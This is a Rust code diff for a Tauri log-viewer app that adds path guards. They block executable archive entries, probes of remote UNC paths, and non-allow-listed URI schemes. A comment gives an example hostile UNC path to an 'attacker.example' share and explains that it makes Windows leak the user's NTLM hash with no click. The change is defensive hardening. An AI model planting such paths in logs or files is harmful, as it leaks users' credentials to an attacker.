@@ -16,6 +16,7 @@ use tauri::{AppHandle, Manager, State, Window};
 use tauri_plugin_dialog::DialogExt;
 use tauri_plugin_opener::OpenerExt;
 
+use crate::pathguard;
 use crate::state::{AppState, CLOSE_TO_TRAY_KEY};
 use crate::windows;
 
@@ -367,6 +368,11 @@ pub fn reveal_local_url(app: AppHandle, url: String) {
 /// collide. Deliberately left behind afterward: the OS app that opens it may
 /// still be reading long after this command returns, same lifetime
 /// tradeoff every other use of `std::env::temp_dir()` in this file accepts.
+///
+/// The entry name is archive content, i.e. attacker-controlled, and the OS
+/// opener RUNS executables and scripts — so an executable type
+/// (`pathguard::is_executable_content`, judged on the basename that would be
+/// written) is refused before anything touches the temp dir.
 static OPEN_TEMP_COUNTER: AtomicU64 = AtomicU64::new(0);
 #[tauri::command(async)]
 pub fn open_extracted_entry(app: AppHandle, name: String, bytes: Vec<u8>) -> Result<(), String> {
@@ -375,6 +381,9 @@ pub fn open_extracted_entry(app: AppHandle, name: String, bytes: Vec<u8>) -> Res
         .map(|n| n.to_string_lossy().to_string())
         .filter(|n| !n.is_empty())
         .unwrap_or_else(|| "file".to_string());
+    if pathguard::is_executable_content(&basename) {
+        return Err(format!("Refusing to open executable content from an archive: {basename}"));
+    }
     let id = OPEN_TEMP_COUNTER.fetch_add(1, Ordering::Relaxed);
     let dir = std::env::temp_dir().join(format!("philogg-zip-open-{}-{}", std::process::id(), id));
     std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
@@ -391,15 +400,36 @@ pub fn open_extracted_entry(app: AppHandle, name: String, bytes: Vec<u8>) -> Res
 /// that is a round trip — `async` keeps it (like every command here that
 /// touches a page-supplied path) off the main thread, which a plain
 /// `#[tauri::command]` runs on, so a slow share can't freeze the window.
+///
+/// That round trip is also the attack: the page checks every path-looking
+/// string on every rendered row, and a UNC path in a hostile log
+/// (`\\attacker.example\share\x`) makes Windows connect and send the user's
+/// NTLM hash — without any click. So a remote path (`pathguard::is_remote_path`)
+/// answers `false` here without touching the filesystem, unless the caller
+/// passes `allow_remote` (the page's `{ allowRemote: true }`): only the IDE
+/// integration does, for source files on a share built from the connected
+/// IDE's own solution path, never for a candidate taken from log text.
+/// `Option` so an older page that sends no flag means "not allowed".
 #[tauri::command(async)]
-pub fn path_exists(path: String) -> bool {
+pub fn path_exists(path: String, allow_remote: Option<bool>) -> bool {
+    if pathguard::is_remote_path(&path) && !allow_remote.unwrap_or(false) {
+        return false;
+    }
     std::fs::metadata(&path).is_ok()
 }
 
 /// Clickable-local-path feature's "Open file" action — the file-itself
-/// counterpart of `reveal_path`'s "Open containing folder".
+/// counterpart of `reveal_path`'s "Open containing folder". Also carries the
+/// IDE integration's `jetbrains://rider/...` deep link (a URI, not a file).
+///
+/// The OS opener RUNS executables and scripts instead of showing them, and the
+/// path comes from log text, so `pathguard::check_open_target` refuses
+/// executable types and every URI scheme but the allow-listed `jetbrains`.
+/// A remote (UNC) path is still allowed: the user chose to click it, and the
+/// credential-leaking probe is cut off earlier, at `path_exists`.
 #[tauri::command]
 pub fn open_path(app: AppHandle, path: String) -> Result<(), String> {
+    pathguard::check_open_target(&path)?;
     app.opener().open_path(path, None::<&str>).map_err(|e| e.to_string())
 }
 
